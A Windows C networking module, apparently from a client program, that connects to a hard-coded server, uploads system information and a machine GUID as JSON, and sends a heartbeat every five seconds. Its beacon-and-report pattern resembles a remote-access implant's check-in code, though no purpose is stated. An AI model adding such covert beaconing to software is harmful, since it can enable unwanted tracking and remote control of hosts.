#include "networking.h"

int init_networking() {
	WSADATA wsa;
	if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
		WSACleanup();

		return 1;
	}

	CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)heartbeat_loop, NULL, NULL, NULL);

	send_system_info();

	return 0;
}

int init_socket(SOCKET* socket_out) {
	SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (sock == INVALID_SOCKET) {
		log_message("init_socket - Failed to create socket\n");
		close_socket(&sock);

		return 1;
	}

	struct sockaddr_in server; // Every piece of data in this struct must be stored network byte order
	inet_pton(AF_INET, SERVER_ADDRESS, &server.sin_addr);
	server.sin_family = AF_INET; // IPV4
	server.sin_port = htons(SERVER_PORT); // Make network byte order

	if (connect(sock, (struct sockaddr*)&server, sizeof(server)) == SOCKET_ERROR) {
		log_message("init_socket - Failed to connect to server\n");
		close_socket(&sock);

		return 1;
	}

	*socket_out = sock;

	return 0;
}

int close_socket(SOCKET* sock) {
	if (closesocket(*sock) == SOCKET_ERROR) {
		log_message("Failed to close socket\n");

		return 1;
	}

	return 0;
}

// TODO: Seperate payload sending with a payload struct too in a new file
int send_payload(JSON_Value* root_value, enum ClientPayloadType payload_type) {
	SOCKET sock;
	if (init_socket(&sock))
		return 1;

	char* system_guid = get_system_guid();
	json_object_dotset_string(json_value_get_object(root_value), "system_guid", system_guid);
	char* json_payload = json_serialize_to_string(root_value);
	free(system_guid);

	char* buf = malloc(CLIENT_BUFFER_SIZE);
	memset(buf, 0, CLIENT_BUFFER_SIZE);

	memcpy(buf, &payload_type, sizeof(payload_type));
	memcpy(&(buf[4]), json_payload, strlen(json_payload));

	int bytes_sent = 0;

	while (bytes_sent < CLIENT_BUFFER_SIZE) {
		int send_ret = send(sock, buf, CLIENT_BUFFER_SIZE, 0);

		if (send_ret == SOCKET_ERROR) {
			log_message("Failed to send payload\n");
			free(buf);

			return 1;
		}

		bytes_sent += send_ret;
	}

	json_free_serialized_string(json_payload);
	json_value_free(root_value);
	free(buf);
	close_socket(&sock);

	return 0;
}

int heartbeat() {
	if (!send_payload(json_value_init_object(), CLIENTPAYLOADTYPE_HEARTBEAT))
		return 1;

	return 0;
}

DWORD heartbeat_loop(void* param) {
	while (1) {
		heartbeat();

		Sleep(5000);
	}

	return 0;
}